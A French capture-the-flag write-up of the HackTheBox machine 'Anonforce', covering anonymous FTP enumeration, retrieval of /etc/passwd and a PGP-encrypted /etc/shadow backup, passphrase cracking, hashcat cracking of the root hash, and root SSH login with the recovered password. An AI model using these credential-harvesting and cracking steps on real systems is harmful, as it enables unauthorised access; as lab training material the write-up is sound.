# CTF Writeup : Anonforce – HackTheBox

> Catégorie : Boot2Root
> Plateforme : HackTheBox
> OS : Ubuntu 16.04 (Linux 4.4.0-157-generic)
> Difficulté : Facile
> IP : 10.129.191.84

---

## Reconnaissance

### Nmap

```bash
nmap -Pn -sC -sV 10.129.191.84
```

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 (Anonymous login) |
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu |

Le scan révèle un FTP avec **login anonyme** qui expose **l'intégralité du système de fichiers** (root `/`).

---

## Exploitation

### 1. Enumération FTP

```bash
ftp 10.129.191.84
# Login : anonymous / (vide)
```

Le listing FTP montre tout le filesystem. Un dossier suspect attire l'attention :

```
drwxrwxrwx  2 1000 1000  4096 Aug 11 2019 notread [NSE: writeable]
```

Contenu de `/notread/` :

| Fichier | Description |
|---------|-------------|
| `backup.pgp` | Fichier chiffré PGP (524 bytes) |
| `private.asc` | Clé privée PGP |

On récupère aussi `/etc/passwd` qui révèle l'utilisateur **melodias** (UID 1000).

### 2. Téléchargement des fichiers

```bash
ftp> binary
ftp> get notread/backup.pgp
ftp> get notread/private.asc
ftp> get etc/passwd
```

### 3. Crack de la passphrase PGP

La clé privée est protégée par une passphrase (S2K iterated+salted, AES-256, SHA-1).

Extraction des paramètres avec `gpg --list-packets` :

| Paramètre | Valeur |
|-----------|--------|
| Algorithme | DSA 2048 bits |
| Chiffrement S2K | AES-256 |
| Hash S2K | SHA-1 |
| Salt | `d7d11d9bf6d08968` |
| Iterations | 65536 |

Crack avec un script Python + wordlist `password.lst` :

```
[+] FOUND: xbox360
```

### 4. Déchiffrement du backup PGP

```bash
gpg --import private.asc        # passphrase : xbox360
gpg --decrypt backup.pgp
```

Le fichier déchiffré contient le **`/etc/shadow`** complet avec les hashes des mots de passe.

### 5. Crack du hash root avec Hashcat

Hash récupéré :

```
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0
```

```bash
hashcat -m 1800 hash_root.txt /usr/share/wordlists/rockyou.txt
```

Résultat en **1 seconde** (RTX 4070 Ti) :

```
$6$07nYFaYf$F4VMaeg...b5RVM0:hikari
```

**Mot de passe root : `hikari`**

### 6. Accès SSH root

```bash
ssh root@10.129.191.84
# password: hikari
```

---

## Flags

```bash
cat /root/root.txt
cat /home/melodias/user.txt
```

---

## Outils utilisés

| Outil | Usage |
|-------|-------|
| Nmap | Scan de ports et services |
| FTP (anonymous) | Enumération du filesystem |
| GPG | Import de clé et déchiffrement |
| Python | Crack de la passphrase PGP (S2K brute force) |
| Hashcat (-m 1800) | Crack du hash SHA-512 (root) |
| SSH | Accès final |

---

## Résumé de la kill chain

```
Nmap → FTP Anonymous (filesystem exposé)
  → /notread/backup.pgp + private.asc
    → Crack passphrase PGP (xbox360)
      → /etc/shadow déchiffré
        → Hashcat SHA-512 → root:hikari
          → SSH root → Flags
```

---

## Leçons apprises

- Un FTP anonyme exposant `/` donne un accès en lecture à tout le système
- Les clés PGP avec des passphrases faibles sont facilement crackables
- Toujours vérifier les dossiers inhabituels (`notread`) — le nom suggère l'inverse de ce qu'il contient
- SHA-512 avec un GPU moderne (RTX 4070 Ti) se crack très rapidement avec une bonne wordlist
